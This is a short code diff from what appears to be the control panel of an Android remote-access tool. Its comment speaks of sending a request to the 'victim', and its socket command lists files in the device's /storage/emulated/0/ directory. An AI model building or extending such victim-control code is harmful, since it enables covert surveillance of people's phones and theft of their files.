@@ -201,7 +201,7 @@ app.controller("FmCtrl", function($scope, $rootScope) {
 
     // send request to victim to bring files
     $rootScope.Log('Get files list');
-    // socket.emit(ORDER, { order: fileManager, extra: 'ls', path: '/' });
+    // socket.emit(ORDER, { order: fileManager, extra: 'ls', path: '/storage/emulated/0/' });
     socket.emit(ORDER, { order: fileManager, extra: 'ls', path: '/storage/emulated/0/' });
 
     socket.on(fileManager, (data) => {
